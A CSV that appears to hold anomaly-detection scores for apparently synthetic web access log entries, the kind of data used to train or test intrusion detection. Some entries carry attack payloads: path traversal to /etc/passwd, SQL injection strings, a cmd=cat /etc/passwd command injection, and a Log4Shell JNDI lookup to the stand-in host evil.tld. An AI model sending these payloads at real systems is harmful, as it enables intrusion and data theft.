score_content,score_session,score_fused,score_fused_norm,line
0.24710826575756073,,0.24710826575756073,0.24710826575756073,136.72.140.106 - - [10/Jan/2025:12:43:08 +0000] "GET /assets/app.css HTTP/1.1" 200 11914 "https://news.ycombinator.com/" "curl/7.85.0"
2.2905428409576416,,2.2905428409576416,2.2905428409576416,150.221.132.180 - - [10/Jan/2025:12:43:10 +0000] "GET / HTTP/1.1" 200 10502 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30220.060546875,,30220.060546875,30220.060546875,85.97.192.100 - - [10/Jan/2025:12:43:12 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 400 314 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.259349822998047,,27.259349822998047,27.259349822998047,131.9.246.182 - - [10/Jan/2025:12:43:13 +0000] "POST /search?q=camera HTTP/1.1" 200 10426 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.43834686279297,,73.43834686279297,73.43834686279297,241.51.187.84 - - [10/Jan/2025:12:43:14 +0000] "OPTIONS /about HTTP/1.1" 200 12844 "https://example.com/" "dirb/2.22"
4.878302574157715,,4.878302574157715,4.878302574157715,70.31.40.117 - - [10/Jan/2025:12:43:15 +0000] "POST /contact HTTP/1.1" 200 18602 "https://example.com/" "sqlmap/1.7.2#stable"
0.2986311614513397,,0.2986311614513397,0.2986311614513397,65.3.122.58 - - [10/Jan/2025:12:43:16 +0000] "GET /assets/app.js HTTP/1.1" 200 19801 "-" "curl/7.85.0"
127.19951629638672,,127.19951629638672,127.19951629638672,172.15.101.170 - - [10/Jan/2025:12:43:19 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1020 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.944189071655273,,4.944189071655273,4.944189071655273,39.219.232.235 - - [10/Jan/2025:12:43:22 +0000] "POST /login HTTP/1.1" 200 15771 "https://www.google.com/" "nikto/2.5.0"
27.750892639160156,,27.750892639160156,27.750892639160156,158.115.79.4 - - [10/Jan/2025:12:43:22 +0000] "DELETE /logout HTTP/1.1" 200 19474 "-" "python-requests/2.31.0"
50.046756744384766,,50.046756744384766,50.046756744384766,237.37.169.137 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 5161 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.11296081542969,,50.11296081542969,50.11296081542969,225.195.140.191 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=router HTTP/1.1" 200 15541 "https://twitter.com/" "dirb/2.22"
2.093827247619629,,2.093827247619629,2.093827247619629,44.65.194.92 - - [10/Jan/2025:12:43:25 +0000] "GET /login HTTP/1.1" 200 15904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2604462802410126,,0.2604462802410126,0.2604462802410126,199.43.84.35 - - [10/Jan/2025:12:43:26 +0000] "GET /assets/app.css HTTP/1.1" 200 15581 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.089092254638672,,30.089092254638672,30.089092254638672,25.225.152.95 - - [10/Jan/2025:12:43:26 +0000] "POST /search?q=camera HTTP/1.1" 301 5257 "https://news.ycombinator.com/" "curl/7.85.0"
30.149513244628906,,30.149513244628906,30.149513244628906,52.124.184.50 - - [10/Jan/2025:12:43:28 +0000] "POST /search?q=router HTTP/1.1" 304 5399 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.591121673583984,,47.591121673583984,47.591121673583984,154.22.209.76 - - [10/Jan/2025:12:43:30 +0000] "HEAD /api/products HTTP/1.1" 200 9096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
45.75154495239258,,45.75154495239258,45.75154495239258,116.229.27.74 - - [10/Jan/2025:12:43:33 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7799 "-" "sqlmap/1.7.2#stable"
76.17807006835938,,76.17807006835938,76.17807006835938,27.25.4.166 - - [10/Jan/2025:12:43:35 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 13709 "-" "dirb/2.22"
27.279375076293945,,27.279375076293945,27.279375076293945,229.189.205.222 - - [10/Jan/2025:12:43:35 +0000] "GET /search?q=laptop HTTP/1.1" 304 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.15196990966797,,27.15196990966797,27.15196990966797,151.100.109.71 - - [10/Jan/2025:12:43:38 +0000] "POST /search?q=headphones HTTP/1.1" 200 3959 "-" "Wget/1.21.2 (linux-gnu)"
70.03817749023438,,70.03817749023438,70.03817749023438,196.103.22.69 - - [10/Jan/2025:12:43:40 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 802 "https://news.ycombinator.com/" "dirb/2.22"
11.713342666625977,,11.713342666625977,11.713342666625977,187.117.72.197 - - [10/Jan/2025:12:43:40 +0000] "PUT /wp-login.php HTTP/1.1" 200 12746 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.66826248168945,,47.66826248168945,47.66826248168945,223.140.56.5 - - [10/Jan/2025:12:43:41 +0000] "HEAD /profile HTTP/1.1" 200 11514 "https://www.google.com/" "nikto/2.5.0"
95.75888061523438,,95.75888061523438,95.75888061523438,228.101.195.231 - - [10/Jan/2025:12:43:41 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 14195 "https://www.google.com/" "nikto/2.5.0"
24.323328018188477,,24.323328018188477,24.323328018188477,110.139.102.30 - - [10/Jan/2025:12:43:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 8856 "https://www.google.com/" "sqlmap/1.7.2#stable"
30.49767303466797,,30.49767303466797,30.49767303466797,82.130.141.86 - - [10/Jan/2025:12:43:43 +0000] "DELETE /dashboard HTTP/1.1" 301 18281 "https://example.com/" "python-requests/2.31.0"
13.316216468811035,,13.316216468811035,13.316216468811035,186.20.216.25 - - [10/Jan/2025:12:43:44 +0000] "PUT /api/products HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.71323776245117,,38.71323776245117,38.71323776245117,90.78.128.20 - - [10/Jan/2025:12:43:44 +0000] "PUT /search?q=phone HTTP/1.1" 302 9010 "https://news.ycombinator.com/" "nikto/2.5.0"
30124.951171875,,30124.951171875,30124.951171875,97.11.118.91 - - [10/Jan/2025:12:43:46 +0000] "GET /assets/app.js HTTP/1.1" 401 22 "https://www.google.com/" "nikto/2.5.0"
30137.931640625,,30137.931640625,30137.931640625,145.95.152.152 - - [10/Jan/2025:12:43:47 +0000] "PUT /contact HTTP/1.1" 401 235 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.950355529785156,,49.950355529785156,49.950355529785156,180.45.108.174 - - [10/Jan/2025:12:43:47 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 8155 "https://twitter.com/" "curl/7.85.0"
104.79460144042969,,104.79460144042969,104.79460144042969,83.21.76.247 - - [10/Jan/2025:12:43:49 +0000] "TRACE /login HTTP/1.1" 200 3620 "https://www.google.com/" "dirb/2.22"
50.052345275878906,,50.052345275878906,50.052345275878906,185.105.221.166 - - [10/Jan/2025:12:43:51 +0000] "DELETE /search?q=camera HTTP/1.1" 200 1965 "https://news.ycombinator.com/" "python-requests/2.31.0"
130.01316833496094,,130.01316833496094,130.01316833496094,80.222.61.24 - - [10/Jan/2025:12:43:51 +0000] "TRACE /search?q=headphones HTTP/1.1" 304 13217 "https://news.ycombinator.com/" "nikto/2.5.0"
2.0432233810424805,,2.0432233810424805,2.0432233810424805,64.18.84.143 - - [10/Jan/2025:12:43:51 +0000] "GET /login HTTP/1.1" 201 4547 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.870668411254883,,4.870668411254883,4.870668411254883,249.16.15.115 - - [10/Jan/2025:12:43:52 +0000] "POST /logout HTTP/1.1" 200 7060 "https://www.google.com/" "sqlmap/1.7.2#stable"
30194.337890625,,30194.337890625,30194.337890625,205.146.198.230 - - [10/Jan/2025:12:43:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 401 671 "https://example.com/" "nikto/2.5.0"
27.603973388671875,,27.603973388671875,27.603973388671875,59.239.224.4 - - [10/Jan/2025:12:43:56 +0000] "DELETE /dashboard HTTP/1.1" 200 8152 "-" "python-requests/2.31.0"
70.02571868896484,,70.02571868896484,70.02571868896484,188.13.34.202 - - [10/Jan/2025:12:43:59 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 4692 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9667563438415527,,1.9667563438415527,1.9667563438415527,87.192.169.24 - - [10/Jan/2025:12:44:01 +0000] "GET /contact HTTP/1.1" 200 655 "https://news.ycombinator.com/" "curl/7.85.0"
127.21916961669922,,127.21916961669922,127.21916961669922,8.208.134.149 - - [10/Jan/2025:12:44:04 +0000] "TRACE /search?q=phone HTTP/1.1" 200 19246 "https://twitter.com/" "curl/7.85.0"
95.74589538574219,,95.74589538574219,95.74589538574219,141.253.154.125 - - [10/Jan/2025:12:44:06 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 393 "https://example.com/" "sqlmap/1.7.2#stable"
13.465807914733887,,13.465807914733887,13.465807914733887,164.236.108.143 - - [10/Jan/2025:12:44:09 +0000] "PUT /about HTTP/1.1" 200 410 "https://example.com/" "sqlmap/1.7.2#stable"
47.67646789550781,,47.67646789550781,47.67646789550781,23.118.109.6 - - [10/Jan/2025:12:44:10 +0000] "HEAD /logout HTTP/1.1" 200 467 "https://twitter.com/" "sqlmap/1.7.2#stable"
47.74476623535156,,47.74476623535156,47.74476623535156,169.141.98.232 - - [10/Jan/2025:12:44:13 +0000] "HEAD /about HTTP/1.1" 200 11883 "-" "python-requests/2.31.0"
3.201997995376587,,3.201997995376587,3.201997995376587,236.61.7.83 - - [10/Jan/2025:12:44:13 +0000] "POST /.git/config HTTP/1.1" 200 19211 "-" "python-requests/2.31.0"
30148.6015625,,30148.6015625,30148.6015625,144.217.107.228 - - [10/Jan/2025:12:44:15 +0000] "GET /search?q=headphones HTTP/1.1" 403 1499 "https://twitter.com/" "curl/7.85.0"
27.680986404418945,,27.680986404418945,27.680986404418945,112.2.149.51 - - [10/Jan/2025:12:44:17 +0000] "DELETE /logout HTTP/1.1" 200 2670 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.47340393066406,,47.47340393066406,47.47340393066406,208.46.19.141 - - [10/Jan/2025:12:44:18 +0000] "HEAD /server-status HTTP/1.1" 200 9118 "https://news.ycombinator.com/" "nikto/2.5.0"
38.65507125854492,,38.65507125854492,38.65507125854492,181.106.253.248 - - [10/Jan/2025:12:44:21 +0000] "PUT /search?q=camera HTTP/1.1" 302 1735 "-" "Wget/1.21.2 (linux-gnu)"
50.10548400878906,,50.10548400878906,50.10548400878906,96.20.6.31 - - [10/Jan/2025:12:44:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 6147 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.910088300704956,,2.910088300704956,2.910088300704956,250.94.122.254 - - [10/Jan/2025:12:44:23 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 2962 "https://www.google.com/" "dirb/2.22"
27.247583389282227,,27.247583389282227,27.247583389282227,14.236.44.152 - - [10/Jan/2025:12:44:25 +0000] "POST /search?q=monitor HTTP/1.1" 200 12883 "https://news.ycombinator.com/" "curl/7.85.0"
30148.556640625,,30148.556640625,30148.556640625,17.80.217.35 - - [10/Jan/2025:12:44:28 +0000] "GET /search?q=camera HTTP/1.1" 400 1104 "https://example.com/" "nikto/2.5.0"
30126.576171875,,30126.576171875,30126.576171875,191.108.62.110 - - [10/Jan/2025:12:44:31 +0000] "GET /profile HTTP/1.1" 404 1147 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
95.70185089111328,,95.70185089111328,95.70185089111328,105.44.106.243 - - [10/Jan/2025:12:44:31 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7544 "-" "dirb/2.22"
7.644413948059082,,7.644413948059082,7.644413948059082,230.107.73.17 - - [10/Jan/2025:12:44:31 +0000] "POST /dashboard HTTP/1.1" 301 11507 "https://example.com/" "nikto/2.5.0"
104.6905517578125,,104.6905517578125,104.6905517578125,162.6.180.160 - - [10/Jan/2025:12:44:34 +0000] "TRACE /api/products HTTP/1.1" 200 11576 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.3012242317199707,,2.3012242317199707,2.3012242317199707,88.161.227.247 - - [10/Jan/2025:12:44:37 +0000] "GET / HTTP/1.1" 204 15089 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.70979309082031,,47.70979309082031,47.70979309082031,54.233.88.122 - - [10/Jan/2025:12:44:39 +0000] "HEAD /logout HTTP/1.1" 200 12759 "-" "Wget/1.21.2 (linux-gnu)"
35.85131072998047,,35.85131072998047,35.85131072998047,54.251.155.39 - - [10/Jan/2025:12:44:40 +0000] "PUT /search?q=camera HTTP/1.1" 200 18761 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.18269348144531,,127.18269348144531,127.18269348144531,68.52.19.123 - - [10/Jan/2025:12:44:43 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 7352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.02964782714844,,70.02964782714844,70.02964782714844,116.163.87.138 - - [10/Jan/2025:12:44:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11750 "https://www.google.com/" "nikto/2.5.0"
24.418224334716797,,24.418224334716797,24.418224334716797,231.49.175.108 - - [10/Jan/2025:12:44:48 +0000] "GET /search?q=camera HTTP/1.1" 200 13527 "https://news.ycombinator.com/" "curl/7.85.0"
47.5339241027832,,47.5339241027832,47.5339241027832,204.26.26.69 - - [10/Jan/2025:12:44:50 +0000] "HEAD /phpmyadmin HTTP/1.1" 200 4245 "https://twitter.com/" "dirb/2.22"
104.75601196289062,,104.75601196289062,104.75601196289062,35.65.8.165 - - [10/Jan/2025:12:44:52 +0000] "TRACE /logout HTTP/1.1" 200 3580 "https://news.ycombinator.com/" "nikto/2.5.0"
30126.826171875,,30126.826171875,30126.826171875,148.193.168.150 - - [10/Jan/2025:12:44:55 +0000] "GET / HTTP/1.1" 403 1073 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.09958910197019577,,0.09958910197019577,0.09958910197019577,194.169.251.70 - - [10/Jan/2025:12:44:56 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 9678 "https://news.ycombinator.com/" "dirb/2.22"
6.263197422027588,,6.263197422027588,6.263197422027588,66.166.141.15 - - [10/Jan/2025:12:44:59 +0000] "POST /.env HTTP/1.1" 302 3875 "https://www.google.com/" "curl/7.85.0"
13.374011993408203,,13.374011993408203,13.374011993408203,113.12.122.49 - - [10/Jan/2025:12:45:00 +0000] "PUT /profile HTTP/1.1" 200 2962 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.21171569824219,,73.21171569824219,73.21171569824219,253.252.192.58 - - [10/Jan/2025:12:45:00 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 201 2223 "https://example.com/" "nikto/2.5.0"
50.103878021240234,,50.103878021240234,50.103878021240234,114.164.36.56 - - [10/Jan/2025:12:45:00 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 5838 "https://www.google.com/" "nikto/2.5.0"
2.3228869438171387,,2.3228869438171387,2.3228869438171387,106.139.53.4 - - [10/Jan/2025:12:45:01 +0000] "GET / HTTP/1.1" 200 19782 "-" "dirb/2.22"
11132.7685546875,,11132.7685546875,11132.7685546875,2.83.158.23 - - [10/Jan/2025:12:45:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 500 712 "https://twitter.com/" "curl/7.85.0"
0.3653656840324402,,0.3653656840324402,0.3653656840324402,24.72.210.232 - - [10/Jan/2025:12:45:03 +0000] "GET /index.html HTTP/1.1" 200 14250 "https://www.google.com/" "nikto/2.5.0"
0.31167295575141907,,0.31167295575141907,0.31167295575141907,205.135.9.66 - - [10/Jan/2025:12:45:06 +0000] "GET /index.html HTTP/1.1" 200 2377 "-" "nikto/2.5.0"
27.783428192138672,,27.783428192138672,27.783428192138672,73.150.50.190 - - [10/Jan/2025:12:45:09 +0000] "DELETE /admin HTTP/1.1" 200 17583 "https://www.google.com/" "dirb/2.22"
2.3165109157562256,,2.3165109157562256,2.3165109157562256,207.149.148.245 - - [10/Jan/2025:12:45:12 +0000] "GET / HTTP/1.1" 201 18332 "-" "sqlmap/1.7.2#stable"
5.00471830368042,,5.00471830368042,5.00471830368042,150.75.188.155 - - [10/Jan/2025:12:45:15 +0000] "GET /admin HTTP/1.1" 304 13915 "https://example.com/" "nikto/2.5.0"
4.767457962036133,,4.767457962036133,4.767457962036133,185.134.169.170 - - [10/Jan/2025:12:45:17 +0000] "POST /api/products HTTP/1.1" 200 7108 "https://twitter.com/" "dirb/2.22"
70.15522003173828,,70.15522003173828,70.15522003173828,190.73.115.197 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 11751 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30194.279296875,,30194.279296875,30194.279296875,148.180.173.84 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 403 308 "https://example.com/" "nikto/2.5.0"
47.72877502441406,,47.72877502441406,47.72877502441406,194.118.178.121 - - [10/Jan/2025:12:45:19 +0000] "HEAD /logout HTTP/1.1" 201 18958 "https://example.com/" "dirb/2.22"
47.76856994628906,,47.76856994628906,47.76856994628906,11.165.57.241 - - [10/Jan/2025:12:45:22 +0000] "HEAD /about HTTP/1.1" 200 18763 "https://example.com/" "curl/7.85.0"
71.50589752197266,,71.50589752197266,71.50589752197266,102.252.1.79 - - [10/Jan/2025:12:45:22 +0000] "OPTIONS /../../etc/passwd HTTP/1.1" 200 2257 "https://twitter.com/" "python-requests/2.31.0"
27.57807731628418,,27.57807731628418,27.57807731628418,127.253.232.16 - - [10/Jan/2025:12:45:24 +0000] "DELETE /api/products HTTP/1.1" 200 886 "https://twitter.com/" "curl/7.85.0"
127.19745635986328,,127.19745635986328,127.19745635986328,216.187.108.57 - - [10/Jan/2025:12:45:25 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1480 "https://example.com/" "python-requests/2.31.0"
35.74810791015625,,35.74810791015625,35.74810791015625,170.52.170.73 - - [10/Jan/2025:12:45:27 +0000] "PUT /search?q=headphones HTTP/1.1" 200 11041 "https://news.ycombinator.com/" "nikto/2.5.0"
95.7912826538086,,95.7912826538086,95.7912826538086,110.180.9.103 - - [10/Jan/2025:12:45:28 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 272 "https://twitter.com/" "python-requests/2.31.0"
3.1380808353424072,,3.1380808353424072,3.1380808353424072,213.221.106.74 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.js HTTP/1.1" 301 13874 "https://www.google.com/" "python-requests/2.31.0"
4.778751850128174,,4.778751850128174,4.778751850128174,101.219.131.98 - - [10/Jan/2025:12:45:31 +0000] "GET /dashboard HTTP/1.1" 302 4364 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.185032844543457,,3.185032844543457,3.185032844543457,28.159.13.47 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.css HTTP/1.1" 304 17430 "https://example.com/" "curl/7.85.0"
30.106098175048828,,30.106098175048828,30.106098175048828,86.141.189.216 - - [10/Jan/2025:12:45:34 +0000] "POST /search?q=laptop HTTP/1.1" 302 4753 "https://twitter.com/" "nikto/2.5.0"
70.18193054199219,,70.18193054199219,70.18193054199219,28.29.206.195 - - [10/Jan/2025:12:45:36 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 19477 "https://twitter.com/" "nikto/2.5.0"
95.78325653076172,,95.78325653076172,95.78325653076172,57.44.116.197 - - [10/Jan/2025:12:45:37 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15002 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.34288024902344,,73.34288024902344,73.34288024902344,36.254.100.209 - - [10/Jan/2025:12:45:40 +0000] "OPTIONS /contact HTTP/1.1" 201 8439 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.789461135864258,,4.789461135864258,4.789461135864258,103.130.218.78 - - [10/Jan/2025:12:45:43 +0000] "GET /dashboard HTTP/1.1" 301 10721 "https://twitter.com/" "curl/7.85.0"
24.241178512573242,,24.241178512573242,24.241178512573242,145.114.129.142 - - [10/Jan/2025:12:45:44 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3849 "https://example.com/" "curl/7.85.0"
1.8922431468963623,,1.8922431468963623,1.8922431468963623,51.63.234.193 - - [10/Jan/2025:12:45:44 +0000] "GET /api/products HTTP/1.1" 200 1119 "-" "dirb/2.22"
50.11424255371094,,50.11424255371094,50.11424255371094,50.179.93.155 - - [10/Jan/2025:12:45:46 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 15919 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.7568588256836,,95.7568588256836,95.7568588256836,110.107.113.166 - - [10/Jan/2025:12:45:47 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 2062 "-" "Wget/1.21.2 (linux-gnu)"
27.279052734375,,27.279052734375,27.279052734375,238.120.64.186 - - [10/Jan/2025:12:45:48 +0000] "POST /search?q=camera HTTP/1.1" 200 15666 "https://twitter.com/" "curl/7.85.0"
27.711254119873047,,27.711254119873047,27.711254119873047,251.196.29.30 - - [10/Jan/2025:12:45:50 +0000] "DELETE /profile HTTP/1.1" 200 18501 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.18646240234375,,50.18646240234375,50.18646240234375,64.108.76.61 - - [10/Jan/2025:12:45:51 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 11998 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.32237374782562256,,0.32237374782562256,0.32237374782562256,56.95.147.50 - - [10/Jan/2025:12:45:54 +0000] "GET /index.html HTTP/1.1" 200 4517 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
